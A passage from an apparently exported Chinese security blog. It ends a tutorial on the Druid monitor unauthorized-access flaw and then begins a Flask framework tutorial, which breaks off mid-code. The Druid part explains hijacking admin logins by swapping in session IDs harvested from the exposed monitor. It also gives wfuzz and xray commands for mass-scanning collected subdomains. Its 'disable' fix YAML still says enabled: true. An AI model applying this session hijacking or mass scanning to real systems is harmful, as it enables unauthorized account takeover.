src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2013.59.42.png" alt="BP分析请求和响应" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.00.34.png" alt="BP分析请求和响应" style="zoom:50%;"><p>可以发现用在Session监控下收集的数据，替换过后，可以得到用户名和用户ID。</p><h3 id="3）利用获取的信息登录管理后台"><a href="#3）利用获取的信息登录管理后台" class="headerlink" title="3）利用获取的信息登录管理后台"></a>3）利用获取的信息登录管理后台</h3><p>我们使用获取用户id，登录对应网站的后台/其他敏感系统。</p><p>密码随便填写，抓包，扔到repeater模块。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.04.34.png" alt="抓包" style="zoom:50%;"><p>不出意外会提示密码错误。</p><p>此时，将sessionid（sid）替换为获取的session信息，username与之对应的账号。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.00.png" alt="抓包更改sessionid" style="zoom:50%;"><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.06.27.png" alt="抓包更改sessionid" style="zoom:50%;"><p>最终可以看到成功登录到后台页面。</p><h1 id="三、批量验证Druid未授权访问漏洞"><a href="#三、批量验证Druid未授权访问漏洞" class="headerlink" title="三、批量验证Druid未授权访问漏洞"></a>三、批量验证Druid未授权访问漏洞</h1><h2 id="3-1-域名收集"><a href="#3-1-域名收集" class="headerlink" title="3.1 域名收集"></a>3.1 域名收集</h2><p>使用Oneforall（挂代理）或其他域名搜集工具收集域名，收集好的域名存入txt。</p><h2 id="3-2-验证域名存活性"><a href="#3-2-验证域名存活性" class="headerlink" title="3.2 验证域名存活性"></a>3.2 验证域名存活性</h2><p>WFUZZ进一步验证子域名的存活性</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wufzz <span class="token parameter variable">-w</span> 子域名.txt <span class="token parameter variable">--hw</span> <span class="token number">0</span> <span class="token parameter variable">--hc</span> <span class="token number">500,501</span>,502,504,505,400 <span class="token parameter variable">-Z</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-f</span> 输出.txt --conn-delay <span class="token number">5</span> http://FUZZ注意：使用--conn-delay <span class="token number">5</span>：为设置超时5秒后跳过，默认是90秒。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>参数详解：</p><p>这条命令是使用 <code>wufuzz</code> 工具进行模糊测试（fuzzing）的命令行示例。<code>wufuzz</code> 是一个基于 Python 的网络模糊测试工具，用于自动化发现Web应用程序中的安全漏洞。下面是命令中各个参数的含义：</p><ul><li><code>wufzz</code>：这是 <code>wufuzz</code> 工具的命令行调用。</li><li><code>-w 子域名.txt</code>：指定一个包含子域名的文件，<code>wufuzz</code> 将使用这些子域名作为测试的输入。</li><li><code>--hw 0</code>： <code>--hw</code> 参数用于隐藏响应中字数符合指定条件的响应。具体来说，<code>--hw</code> 参数后面跟随的是一个数字或数字范围，表示如果响应内容的字数等于或超过这个数字时，该响应将被隐藏，不会被显示出来。<code>--hw 0</code> 表示隐藏所有响应内容字数为0的响应。这通常意味着服务器没有返回任何内容，可能是服务器错误或者请求没有成功到达服务器。这个参数对于在进行模糊测试时过滤掉那些没有实际意义的响应是很有用的，比如空响应或者非常常见的错误响应，从而使测试者能够更专注于那些可能表明潜在漏洞或配置错误的响应。</li><li><code>--hc 500,501,502,504,505,400</code>：指定要忽略的 HTTP 响应代码。在这个例子中，<code>wufuzz</code> 将忽略 500、501、502、504、505 和 400 状态码的响应。</li><li><code>-Z</code>：这个参数的作用是使 <code>wufuzz</code> 在发现一个有效的响应时，不立即停止，而是继续测试，直到所有的测试用例都执行完毕。</li><li><code>-L</code>：这个参数的作用是在发现一个有效的响应时，打印出请求和响应的详细信息。</li><li><code>-f 输出.txt</code>：将发现的漏洞或有效响应保存到指定的文件中。</li><li><code>--conn-delay 5</code>：设置两次连续请求之间的延迟时间为 5 秒。这有助于减少对目标服务器的压力，并避免因请求频率过高而被服务器限制。</li><li><code>http://FUZZ</code>：这是要测试的 URL 模板，<code>FUZZ</code> 是一个占位符，<code>wufuzz</code> 会用 <code>子域名.txt</code> 文件中的子域名替换它，生成完整的 URL 进行测试。</li></ul><p>综上所述，这条命令的作用是：使用 <code>wufuzz</code> 对一个或多个子域名进行模糊测试，测试过程中忽略特定的 HTTP 状态码，设置超时和请求延迟，并将发现的漏洞或有效响应保存到文件中。这种类型的测试通常用于发现 Web 应用程序中的安全漏洞，如路径遍历、信息泄露等。</p></blockquote><p>预处理一下wufzz的输出结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">spl</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>saveFile<span class="token punctuation">)</span><span class="token punctuation">:</span>    openFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    saveFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>saveFile<span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>    lines <span class="token operator">=</span> openFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        x <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        x1 <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> x        saveFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>x1<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span>    saveFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    openFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    filePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Input your filepath: "</span><span class="token punctuation">)</span>    savePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Sava File name: "</span><span class="token punctuation">)</span>    spl<span class="token punctuation">(</span>filePath<span class="token punctuation">,</span>savePath<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hey BOY,Fighiting@@@"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-xray批量扫描"><a href="#3-3-xray批量扫描" class="headerlink" title="3.3 xray批量扫描"></a>3.3 xray批量扫描</h2><p>Xray单独开启Druid检测插件，进行批量检测：</p><p>把config.yaml中其他检测都关掉，比如SQL注入，XSS注入等等，可以更快的更有针对性只针对Druid未授权进行检测。</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.17.48.png" alt="config.yaml配置" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./xray webscan <span class="token parameter variable">--poc</span> poc-yaml-druid-monitor-unauth--url-file ./存活的子域名.txt --html-output test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>xray</code> 是一个安全评估工具，由长亭科技开发，用于自动化地发现和利用 Web 应用中的安全漏洞。下面是命令中各个参数的含义：</p><ul><li><code>./xray</code>：这是调用 <code>xray</code> 工具的命令行调用。</li><li><code>webscan</code>：这是 <code>xray</code> 的一个子命令，用于执行 Web 应用的安全扫描。</li><li><code>--poc</code>：指定要使用的漏洞检测规则（Proof of Concept，简称 PoC），在这个例子中，<code>poc-yaml-druid-monitor-unauth</code> 是一个 YAML 文件，包含了针对 Druid 监控未授权访问漏洞的检测规则。</li><li><code>--url-file</code>：指定一个包含 URL 的文件，<code>xray</code> 将使用这些 URL 作为测试的目标。</li><li><code>./存活的子域名.txt</code>：这是包含存活子域名的文件路径，<code>xray</code> 将读取这个文件中的 URL 并针对它们执行安全扫描。</li><li><code>--html-output</code>：指定输出结果的 HTML 文件路径。</li><li><code>test.html</code>：这是输出结果的 HTML 文件名，<code>xray</code> 将把扫描结果以 HTML 格式保存到这个文件中。</li></ul><p>综上所述，这条命令的作用是：使用 <code>xray</code> 工具，配合 Druid 监控未授权访问漏洞的检测规则，对存活的子域名列表中的每个 URL 进行安全扫描，并将扫描结果以 HTML 格式输出到 <code>test.html</code> 文件中。这种类型的扫描可以帮助发现 Web 应用中的安全漏洞，特别是针对 Druid 监控未授权访问的漏洞。</p></blockquote><h1 id="四、Druid未授权访问漏洞的修复"><a href="#四、Druid未授权访问漏洞的修复" class="headerlink" title="四、Druid未授权访问漏洞的修复"></a>四、Druid未授权访问漏洞的修复</h1><ul><li><strong>方法1</strong>：设置StatViewServlet（监控页面）为<code>false</code>，即禁用监控页面。</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">druid</span><span class="token punctuation">:</span>      <span class="token key atrule">stat-view-servlet</span><span class="token punctuation">:</span>        <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token comment"># 是否启用StatViewServlet(监控页面)</span>        <span class="token key atrule">reset-enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 禁用HTML页面上的"Reset All"功能</span>        <span class="token key atrule">login-username</span><span class="token punctuation">:</span> xxxx <span class="token comment"># 设置账户名称（增加登录权限）</span>        <span class="token key atrule">login-password</span><span class="token punctuation">:</span> xxxxxxxx <span class="token comment"># 设置账户密码</span>        <span class="token key atrule">allow</span><span class="token punctuation">:</span> 127.0.0.1 <span class="token comment"># IP白名单</span>        <span class="token key atrule">deny</span><span class="token punctuation">:</span> 10.0.0.1 <span class="token comment"># IP黑名单</span>        <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> <span class="token string">'/druid/*'</span> <span class="token comment"># 自定义Druid连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>方法2</strong>：给Druid的Web页面设置账户密码，增加访问Druid的权限。这种方法推荐使用，因为它允许在鉴权后仍然能够查看监控信息。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/alibaba/druid">Druid 官方文档</a></li><li><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a> 阿里云开发者社区</li><li><a href="https://cloud.tencent.com/developer/article/1771986">https://cloud.tencent.com/developer/article/1771986</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> Druid未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架</title>
      <link href="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/"/>
      <url>/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Flask简介"><a href="#一、Flask简介" class="headerlink" title="一、Flask简介"></a>一、Flask简介</h1><h2 id="1-1-什么是Flask？"><a href="#1-1-什么是Flask？" class="headerlink" title="1.1 什么是Flask？"></a>1.1 什么是Flask？</h2><p>Flask 是一个用 <strong>Python</strong> 编写的轻量级 Web 应用框架。它遵循 <strong>WSGI（Web Server Gateway Interface）</strong> 规范，并使用 <strong>Jinja2</strong> 模板引擎。Flask 的设计哲学是简单、灵活、可扩展，适用于从简单的原型开发到复杂的 Web 应用。</p><h2 id="1-2-Flask-的特点"><a href="#1-2-Flask-的特点" class="headerlink" title="1.2  Flask 的特点"></a>1.2  Flask 的特点</h2><ul><li><p><strong>轻量级</strong>：Flask 是一个微框架（Microframework），本身只提供核心功能，其他功能通过扩展实现，避免了不必要的功能加载。</p></li><li><p><strong>灵活性</strong>：Flask 不强制开发者遵循固定的目录结构或编程风格，开发者可以根据需要自由定制。</p></li><li><p><strong>内置开发服务器</strong>：提供一个简单的开发服务器，便于快速启动和调试。</p></li><li><p><strong>扩展性</strong>：支持丰富的扩展库，如数据库、认证、表单验证等，这些扩展可与 Flask 无缝集成。</p></li><li><p><strong>Jinja2 模板引擎</strong>：支持动态 HTML 页面生成。</p></li><li><p><strong>路由管理</strong>：内置路由功能，便于 URL 映射到视图函数。</p></li></ul><h2 id="1-3-核心组件"><a href="#1-3-核心组件" class="headerlink" title="1.3 核心组件"></a>1.3 核心组件</h2><ul><li><p><strong>Flask 核心对象</strong>：<code>Flask</code> 类用于创建应用实例。</p></li><li><p><strong>路由（Routing）</strong>：使用 <code>@app.route</code> 装饰器定义 URL 与视图函数的映射。</p></li><li><p><strong>模板引擎</strong>：使用 Jinja2 渲染 HTML 模板，并支持变量替换和控制结构（如循环、条件）。</p></li><li><p><strong>请求与响应</strong>：<code>request</code> 对象用于处理 HTTP 请求，<code>response</code> 对象用于返回响应。</p></li><li><p><strong>错误处理</strong>：内置错误处理机制，可自定义错误页面。</p></li></ul><h2 id="1-4-Flask的主要扩展"><a href="#1-4-Flask的主要扩展" class="headerlink" title="1.4 Flask的主要扩展"></a>1.4 Flask的主要扩展</h2><ul><li><p><strong>Flask-SQLAlchemy</strong>：ORM（对象关系映射）工具，用于数据库操作。</p></li><li><p><strong>Flask-WTF</strong>：处理表单和 CSRF 防护。</p></li><li><p><strong>Flask-Login</strong>：用户认证与管理。</p></li><li><p><strong>Flask-Migrate</strong>：数据库迁移管理。</p></li><li><p><strong>Flask-Mail</strong>：处理邮件发送。</p></li></ul><h2 id="1-5-适用场景"><a href="#1-5-适用场景" class="headerlink" title="1.5 适用场景"></a>1.5 适用场景</h2><ul><li><strong>快速原型开发</strong>：Flask 轻量、灵活，非常适合快速验证产品概念。</li><li><strong>API 开发</strong>：使用 Flask 可以快速构建 RESTful API 服务。</li><li><strong>小型 Web 应用</strong>：适合开发中小型网站或应用程序。</li><li><strong>微服务架构</strong>：由于其轻量和扩展性，Flask 是构建微服务的理想选择。</li></ul><blockquote><p>什么是RESTful API？</p><p>RESTful API是一种设计简洁、易于使用的网络接口风格，它通过HTTP方法（如GET、POST、PUT、DELETE）让客户端与服务器交换数据。这种接口风格遵循无状态、统一接口等原则，使得网络服务更直观、高效。</p><p>RESTful API通常使用以下HTTP方法：</p><ul><li><strong>GET</strong>：请求从服务器检索特定资源。GET请求应该是安全的，不会产生副作用。</li><li><strong>POST</strong>：向服务器提交数据以创建新资源。</li><li><strong>PUT</strong>：更新服务器上的现有资源或创建新资源。</li><li><strong>DELETE</strong>：从服务器删除资源。</li><li><strong>PATCH</strong>：对资源进行部分修改。</li></ul><p>例子：</p><ol><li>GET /users：获取用户列表。</li><li>POST /users：创建新用户。</li><li>PUT /users/{id}：更新特定用户信息。</li><li>DELETE /users/{id}：删除特定用户。</li></ol><p>总的来说，RESTful API是一种设计简洁、易于理解和使用的API风格，它使得客户端和服务器之间的通信更加直观和高效。</p></blockquote><h2 id="1-6-与其他框架的对比"><a href="#1-6-与其他框架的对比" class="headerlink" title="1.6 与其他框架的对比"></a>1.6 与其他框架的对比</h2><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-04%2017.07.10.png" alt="Flask vs Django vs FastAPI" style="zoom:50%;"><p>Flask 是一个非常适合快速开发、轻量级 Web 应用的框架。如果你需要一个简单易用、灵活可扩展的 Python Web 框架，Flask 是一个很好的选择。</p><h1 id="二、Flask-的基本应用结构"><a href="#二、Flask-的基本应用结构" class="headerlink" title="二、Flask 的基本应用结构"></a>二、Flask 的基本应用结构</h1><p>一个简单的 Flask 应用示例如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token comment"># 创建 Flask 应用实例</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment"># 定义路由与视图函数</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/greet/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">greet</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token comment"># 启动应用</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、Flask常用模块"><a href="#三、Flask常用模块" class="headerlink" title="三、Flask常用模块"></a>三、Flask常用模块</h1><h2 id="3-1-Flask"><a href="#3-1-Flask" class="headerlink" title="3.1 Flask"></a>3.1 Flask</h2><h3 id="3-1-1-Flask类的基本使用"><a href="#3-1-1-Flask类的基本使用" class="headerlink" title="3.1.1 Flask类的基本使用"></a>3.1.1 Flask类的基本使用</h3><p><strong>用途</strong>：核心模块，用于创建和管理 Flask 应用程序。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>app = Flask(__name__)</code> 是 Flask 应用的基础代码，它用于创建一个 Flask 应用实例。</p><h3 id="1-Flask-类"><a href="#1-Flask-类" class="headerlink" title="1. Flask 类"></a><strong>1. <code>Flask</code> 类</strong></h3><ul><li><code>Flask</code> 是 Flask 框架提供的核心类，负责处理 HTTP 请求、管理路由、加载配置等功能。</li><li>通过实例化 <code>Flask</code> 类，可以生成一个应用对象，用于组织和运行整个 Web 应用。</li></ul><h3 id="2-name-参数"><a href="#2-name-参数" class="headerlink" title="2. __name__ 参数"></a><strong>2. <code>__name__</code> 参数</strong></h3><ul><li><code>__name__</code>是 Python 的特殊变量，用于标识当前模块的名字。<ul><li>如果该模块是直接运行的脚本，<code>__name__</code> 的值为 <code>'__main__'</code>。</li><li>如果该模块是被导入的，<code>__name__</code> 的值为模块的名称。</li></ul></li><li>在 Flask 中，<code>__name__</code>的作用<ul><li><strong>确定应用的根路径</strong>：Flask 使用它定位应用所在的目录，这对加载静态文件（如 CSS、JS）和模板文件（如 HTML）至关重要。</li></ul></li></ul><h3 id="3-app-变量"><a href="#3-app-变量" class="headerlink" title="3. app 变量"></a><strong>3. <code>app</code> 变量</strong></h3><ul><li><p><code>app</code> 是通过 <code>Flask</code> 类实例化得到的对象，它代表了整个 Flask 应用实例。</p></li><li><p>它是 Web 应用的核心，用于注册路由、处理请求、配置应用、管理扩展等。</p></li><li><p>常见用法：</p><p><strong>定义路由</strong>：</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​       <strong>运行应用：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>总结：<code>app = Flask(__name__)</code> 是 Flask 应用开发的起点，用来初始化一个 Web 应用对象。<code>Flask</code> 类负责提供应用的功能，而 <code>__name__</code> 帮助框架定位资源路径和运行环境。</p></blockquote><h3 id="3-1-2-监听0-0-0-0和127-0-0-1的区别"><a href="#3-1-2-监听0-0-0-0和127-0-0-1的区别" class="headerlink" title="3.1.2 监听0.0.0.0和127.0.0.1的区别"></a>3.1.2 监听0.0.0.0和127.0.0.1的区别</h3><p>app.run(host=‘0.0.0.0’,port=5001) 和app.run(host=‘127.0.0.1’,port=5001) </p><blockquote><p><code>app.run(host='0.0.0.0', port=5001)</code> 和 <code>app.run(host='127.0.0.1', port=5001)</code> 都是启动 Flask 应用的方法，但它们在 <strong>监听地址</strong> 和 <strong>访问方式</strong> 上存在差异。以下是详细解释：</p><h3 id="1-共同点"><a href="#1-共同点" class="headerlink" title="1. 共同点"></a>1. <strong>共同点</strong></h3><ul><li><strong>功能</strong>：两者都用于启动 Flask 开发服务器，监听指定的主机地址和端口。</li><li><strong>端口号</strong>：两者都监听 <code>5001</code> 端口，可以通过浏览器或 HTTP 客户端访问。</li></ul><h3 id="2-差异：监听地址（host-参数）"><a href="#2-差异：监听地址（host-参数）" class="headerlink" title="2. 差异：监听地址（host 参数）"></a>2. <strong>差异：监听地址（<code>host</code> 参数）</strong></h3><h4 id="host-0-0-0-0"><a href="#host-0-0-0-0" class="headerlink" title="host='0.0.0.0'"></a><strong><code>host='0.0.0.0'</code></strong></h4><ul><li>含义：<ul><li><code>0.0.0.0</code> 是一个特殊的 IP 地址，表示<strong>监听所有网络接口</strong>（包括本地接口和外部接口）。</li></ul></li><li><strong>结果</strong>：<ul><li>应用可以被<strong>本机（localhost）和同一局域网中的其他设备</strong>访问。</li><li>示例：<ul><li>本地访问：<code>http://127.0.0.1:5001</code></li><li>局域网访问：<code>http://&lt;你的局域网 IP&gt;:5001</code>（如 <code>http://192.168.1.100:5001</code>）</li></ul></li></ul></li></ul><h4 id="host-127-0-0-1"><a href="#host-127-0-0-1" class="headerlink" title="host='127.0.0.1'"></a><strong><code>host='127.0.0.1'</code></strong></h4><ul><li>含义：<ul><li><code>127.0.0.1</code> 是本地回环地址（localhost），只监听本地接口。</li></ul></li><li>结果：<ul><li>应用<strong>只能被本机访问</strong>，无法被其他设备访问。</li><li>示例：<ul><li>本地访问：<code>http://127.0.0.1:5001</code></li><li>局域网设备无法访问。</li></ul></li></ul></li></ul><h3 id="3-实际用途"><a href="#3-实际用途" class="headerlink" title="3.实际用途"></a>3.<strong>实际用途</strong></h3><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-06%2010.41.55.png" alt="实际用途" style="zoom:50%;"><h3 id="4-安全性注意事项"><a href="#4-安全性注意事项" class="headerlink" title="4. 安全性注意事项"></a>4. <strong>安全性注意事项</strong></h3><ul><li>开发环境：<ul><li>Flask 自带的开发服务器不适合生产环境，<code>host='0.0.0.0'</code> 时需特别小心，避免暴露到公网。</li></ul></li><li>生产环境：<ul><li>使用专业的 WSGI 服务器（如 <strong>gunicorn</strong> 或 <strong>uWSGI</strong>）配合反向代理服务器（如 Nginx）运行应用，提供更高的性能和安全性。</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>**<code>host='127.0.0.1'</code>**：仅限本机访问，适合安全性要求较高的开发场景。</li><li>**<code>host='0.0.0.0'</code>**：允许外部设备访问，适合局域网测试或需要共享的场景，但需注意潜在的安全风险。</li></ul></blockquote><h2 id="3-2-jsonify"><a href="#3-2-jsonify" class="headerlink" title="3.2 jsonify"></a>3.2 jsonify</h2><p><strong>用途</strong>：将 Python 数据结构（如字典、列表等）转换为 JSON 格式并返回 HTTP 响应。</p><p><strong>特点</strong>：自动设置响应的 <code>Content-Type</code> 为 <code>application/json</code>。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-request"><a href="#3-3-request" class="headerlink" title="3.3 request"></a>3.3 request</h2><p><strong>用途</strong>：获取客户端发送的 HTTP 请求信息，包括数据、头部、方法等。</p><p><strong>常用方法</strong>：</p><ul><li><code>request.args</code>：获取查询参数（GET 请求）。</li><li><code>request.form</code>：获取表单数据（POST 请求）。</li><li><code>request.json</code>：获取 JSON 格式的数据。</li></ul><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/form'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-redirect"><a href="#3-4-redirect" class="headerlink" title="3.4 redirect"></a>3.4 redirect</h2><p><strong>用途</strong>：重定向到指定的 URL。</p><p><strong>特点</strong>：通常与 HTTP 状态码 302 或 301 一起使用。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/old'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">old</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/new'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-render-template"><a href="#3-5-render-template" class="headerlink" title="3.5 render_template"></a>3.5 <strong>render_template</strong></h2><ul><li><strong>用途</strong>：渲染模板文件（如 HTML），动态生成网页内容。</li><li><strong>特点</strong>：使用 Jinja2 模板引擎，支持变量替换和逻辑控制。</li><li><strong>示例</strong>：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token 